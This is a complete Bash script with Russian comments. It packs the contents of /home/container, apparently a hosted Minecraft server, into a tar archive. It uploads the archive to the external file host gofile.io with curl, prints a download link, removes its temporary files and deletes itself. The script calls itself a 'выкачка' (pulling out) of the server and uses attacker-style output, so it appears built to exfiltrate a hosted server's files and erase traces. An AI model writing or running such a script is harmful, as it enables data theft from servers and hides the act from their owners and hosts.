#!/bin/bash

# ============================================
# СКРИПТ ВЫКАЧКИ СЕРВЕРА НА GOFILE + САМОУДАЛЕНИЕ
# ============================================

# 1. Архивируем сервер
echo "[+] Архивирую /home/container..."
tar -czf /tmp/server_backup.tar.gz -C /home/container . 2>/dev/null

# 2. Проверяем, что архив создался
if [ ! -f /tmp/server_backup.tar.gz ]; then
    echo "[-] Ошибка: архив не создан!"
    exit 1
fi

# 3. Получаем токен Gofile
echo "[+] Получаю токен Gofile..."
TOKEN=$(curl -s -X POST "https://api.gofile.io/accounts" | grep -o '"token":"[^"]*' | cut -d'"' -f4)

if [ -z "$TOKEN" ]; then
    echo "[-] Не удалось получить токен, пробую без авторизации..."
    TOKEN=""
fi

# 4. Создаём папку на Gofile
echo "[+] Создаю папку на Gofile..."
if [ -n "$TOKEN" ]; then
    FOLDER_ID=$(curl -s -X POST "https://api.gofile.io/contents" \
        -H "Authorization: Bearer $TOKEN" \
        -H "Content-Type: application/json" \
        -d '{"name": "Minecraft_Backup"}' | grep -o '"id":"[^"]*' | cut -d'"' -f4)
else
    # Если токена нет — создаём папку без авторизации (иногда работает)
    FOLDER_ID=$(curl -s -X POST "https://api.gofile.io/contents" \
        -H "Content-Type: application/json" \
        -d '{"name": "Minecraft_Backup"}' | grep -o '"id":"[^"]*' | cut -d'"' -f4)
fi

if [ -z "$FOLDER_ID" ]; then
    echo "[-] Не удалось создать папку, пробую загрузить напрямую в корень..."
    FOLDER_ID=""
fi

# 5. Загружаем архив
echo "[+] Загружаю архив..."
if [ -n "$FOLDER_ID" ]; then
    curl -s -X POST "https://api.gofile.io/contents/$FOLDER_ID/upload" \
        -H "Authorization: Bearer $TOKEN" \
        -F "file=@/tmp/server_backup.tar.gz" > /tmp/upload_result.txt
else
    # Альтернативная загрузка через простой POST
    curl -s -F "file=@/tmp/server_backup.tar.gz" "https://gofile.io/upload" > /tmp/upload_result.txt
fi

# 6. Выводим ссылку
echo ""
echo "========================================="
echo "[+] Ссылка на скачивание:"
if [ -n "$FOLDER_ID" ]; then
    echo "https://gofile.io/d/$FOLDER_ID"
else
    echo "   (ссылка будет в выводе выше или в /tmp/upload_result.txt)"
    cat /tmp/upload_result.txt | grep -o "https://gofile.io/d/[^\"]*" || echo "   Проверь /tmp/upload_result.txt"
fi
echo "========================================="

# 7. Очистка
echo "[+] Удаляю временные файлы..."
rm -f /tmp/server_backup.tar.gz /tmp/upload_result.txt

# 8. САМОУДАЛЕНИЕ скрипта
echo "[+] Удаляю себя..."
rm -f "$0"

echo "[+] Готово! Скрипт самоуничтожился."